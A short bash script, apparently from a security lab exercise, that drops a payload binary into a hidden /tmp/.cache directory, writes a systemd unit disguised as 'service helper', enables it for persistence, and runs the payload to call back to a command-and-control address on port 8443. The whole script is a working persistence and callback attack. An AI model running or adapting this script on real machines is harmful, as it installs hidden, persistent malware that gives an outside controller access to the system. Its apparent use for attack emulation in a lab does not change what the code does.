#!/usr/bin/env bash
# attack（窗口内）：投放 + systemd 单元写入/enable + 服务式执行回连。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
cp payload.elf /tmp/.cache/sysupd/payload.elf && chmod 0755 /tmp/.cache/sysupd/payload.elf
printf '[Unit]\nDescription=service helper\n[Service]\nType=oneshot\nExecStart=/tmp/.cache/sysupd/payload.elf %s 8443\n[Install]\nWantedBy=multi-user.target\n' "$C2_IP" > /etc/systemd/system/sysupd.service
systemctl daemon-reload
systemctl enable sysupd.service >/dev/null 2>&1 || true
/tmp/.cache/sysupd/payload.elf "$C2_IP" 8443
